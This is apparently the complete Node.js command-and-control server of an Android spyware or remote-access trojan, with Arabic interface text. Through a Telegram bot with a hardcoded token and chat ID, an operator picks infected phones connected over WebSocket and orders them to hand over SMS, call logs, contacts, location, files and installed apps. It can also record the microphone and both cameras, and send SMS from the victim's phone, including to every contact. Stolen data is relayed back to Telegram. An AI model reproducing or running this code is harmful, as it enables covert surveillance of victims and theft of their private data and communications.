const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';

// Routes
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ النظام يعمل</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من: <b>${model}</b>\n📄 ${filename}`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model}`);
    
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل\n\n` +
        `📱 <b>${model}</b>\n` +
        `🔋 <b>${battery}%</b>\n` +
        `🤖 <b>${version}</b>\n` +
        `🆔 <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    ws.on('close', () => {
        console.log(`❌ انقطع: ${model}`);
        bot.sendMessage(id, `❌ انقطع: <b>${model}</b>`, { parse_mode: 'HTML' });
        clients.delete(uuid);
    });
});

// ⭐⭐ إصلاح معالجة الرسائل - تبسيط
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== id) {
        return;
    }
    
    console.log(`📩 رسالة: ${text}`);
    
    // معالجة الردود
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    // الأوامر الرئيسية
    switch(text) {
        case '/start':
            showMainMenu();
            break;
        case '📱 الأجهزة المتصلة':
            showConnectedDevices();
            break;
        case '📋 قائمة الأوامر':
            showCommandsList();
            break;
        case '🔄 تحديث':
            showConnectedDevices();
            break;
        default:
            bot.sendMessage(id, '❌ استخدم /start للبدء');
    }
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        bot.sendMessage(id, '❌ حدد الجهاز أولاً');
        return;
    }
    
    if (replyText.includes('أدخل الرقم')) {
        currentNumber = userText;
        bot.sendMessage(id, '📝 أدخل الرسالة:', { 
            reply_markup: { force_reply: true } 
        });
    }
    else if (replyText.includes('أدخل الرسالة')) {
        sendCommand(currentUuid, `send_message:${currentNumber}/${userText}`);
        showMainMenu('✅ تم الإرسال');
    }
    else if (replyText.includes('رسالة للجميع')) {
        sendCommand(currentUuid, `send_message_to_all:${userText}`);
        showMainMenu('✅ تم الإرسال');
    }
    else if (replyText.includes('مسار الملف')) {
        sendCommand(currentUuid, `file:${userText}`);
        showMainMenu('✅ جاري الجلب');
    }
    else if (replyText.includes('مدة التسجيل')) {
        sendCommand(currentUuid, `microphone:${userText}`);
        showMainMenu('🎤 جاري التسجيل');
    }
    else if (replyText.includes('الكاميرا الأمامية')) {
        sendCommand(currentUuid, `rec_camera_selfie:${userText}`);
        showMainMenu('📸 جاري الالتقاط');
    }
    else if (replyText.includes('الكاميرا الخلفية')) {
        sendCommand(currentUuid, `rec_camera_main:${userText}`);
        showMainMenu('📷 جاري الالتقاط');
    }
    else if (replyText.includes('نص التنبيه')) {
        sendCommand(currentUuid, `toast:${userText}`);
        showMainMenu('✅ تم العرض');
    }
}

// ⭐⭐ إصلاح الـ Callback Queries - تبسيط
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    console.log(`🔘 callback: ${data}`);
    
    try {
        // الرد الفوري على callback
        bot.answerCallbackQuery(callbackQuery.id);
        
        const [action, uuid] = data.split(':');
        const device = clients.get(uuid);
        
        if (!device) {
            bot.sendMessage(id, '❌ الجهاز غير متصل حالياً');
            return;
        }
        
        switch(action) {
            case 'device':
                showDeviceCommands(message, uuid, device);
                break;
            case 'info':
                sendCommand(uuid, 'device_info');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📊 جاري جمع المعلومات');
                break;
            case 'sms':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📱 أدخل الرقم:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'calls':
                sendCommand(uuid, 'calls');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📞 جاري الجلب');
                break;
            case 'contacts':
                sendCommand(uuid, 'contacts');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('👥 جاري الجلب');
                break;
            case 'messages':
                sendCommand(uuid, 'messages');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('💬 جاري الجلب');
                break;
            case 'location':
                sendCommand(uuid, 'location');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📍 جاري الموقع');
                break;
            case 'microphone':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🎤 المدة بالثواني:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'camera_front':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📸 المدة للكاميرا الأمامية:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'camera_back':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📷 المدة للكاميرا الخلفية:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'files':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📁 مسار الملف:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'toast':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🔔 نص التنبيه:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
            case 'vibrate':
                sendCommand(uuid, 'vibrate');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📳 جاري الاهتزاز');
                break;
            case 'apps':
                sendCommand(uuid, 'apps');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📱 جاري الجلب');
                break;
            default:
                bot.sendMessage(id, '❌ أمر غير معروف');
        }
        
    } catch (error) {
        console.error('❌ خطأ في callback:', error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
    }
});

// الدوال المساعدة
function sendCommand(uuid, command) {
    const device = clients.get(uuid);
    if (device && device.connection.readyState === WebSocket.OPEN) {
        device.connection.send(command);
        console.log(`✅ أمر مرسل: ${command} إلى ${uuid}`);
        return true;
    } else {
        console.log(`❌ فشل إرسال: ${command} - الجهاز غير متصل`);
        bot.sendMessage(id, '❌ الجهاز غير متصل حالياً');
        return false;
    }
}

function showMainMenu(text = 'اختر من القائمة:') {
    bot.sendMessage(id, text, {
        reply_markup: {
            keyboard: [
                ['📱 الأجهزة المتصلة', '📋 قائمة الأوامر'],
                ['🔄 تحديث']
            ],
            resize_keyboard: true
        }
    });
}

function showConnectedDevices() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    let devicesText = `📱 الأجهزة المتصلة (${clients.size}):\n\n`;
    
    clients.forEach((device, uuid) => {
        devicesText += 
            `📱 ${device.model}\n` +
            `🔋 ${device.battery}% | 🤖 ${device.version}\n` +
            `🆔 ${uuid.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(id, devicesText, {
        reply_markup: {
            inline_keyboard: [[
                { text: '🔄 تحديث', callback_data: 'refresh' }
            ]]
        }
    });
}

function showCommandsList() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    const deviceButtons = [];
    clients.forEach((device, uuid) => {
        deviceButtons.push([{
            text: `📱 ${device.model} (${device.battery}%)`,
            callback_data: `device:${uuid}`
        }]);
    });
    
    bot.sendMessage(id, '🔘 اختر الجهاز:', {
        reply_markup: { 
            inline_keyboard: deviceButtons,
            resize_keyboard: true
        }
    });
}

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [
            { text: '📊 معلومات', callback_data: `info:${uuid}` },
            { text: '📍 موقع', callback_data: `location:${uuid}` }
        ],
        [
            { text: '📞 مكالمات', callback_data: `calls:${uuid}` },
            { text: '💬 رسائل', callback_data: `messages:${uuid}` }
        ],
        [
            { text: '👥 جهات اتصال', callback_data: `contacts:${uuid}` },
            { text: '📱 تطبيقات', callback_data: `apps:${uuid}` }
        ],
        [
            { text: '📨 إرسال رسالة', callback_data: `sms:${uuid}` }
        ],
        [
            { text: '🎤 ميكروفون', callback_data: `microphone:${uuid}` },
            { text: '📸 أمامية', callback_data: `camera_front:${uuid}` },
            { text: '📷 خلفية', callback_data: `camera_back:${uuid}` }
        ],
        [
            { text: '📁 ملفات', callback_data: `files:${uuid}` },
            { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
            { text: '🔔 تنبيه', callback_data: `toast:${uuid}` }
        ]
    ];
    
    bot.editMessageText(
        `⚙️ أوامر الجهاز:\n📱 ${device.model}\n🔋 ${device.battery}%`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: { 
                inline_keyboard: keyboard,
                resize_keyboard: true
            }
        }
    ).catch(err => {
        console.error('❌ خطأ في تعديل الرسالة:', err);
        // إذا فشل التعديل، أرسل رسالة جديدة
        bot.sendMessage(id, `⚙️ أوامر الجهاز:\n📱 ${device.model}\n🔋 ${device.battery}%`, {
            reply_markup: { 
                inline_keyboard: keyboard,
                resize_keyboard: true
            }
        });
    });
}

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log('🤖 البوت جاهز لاستقبال الأوامر...');
});

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});
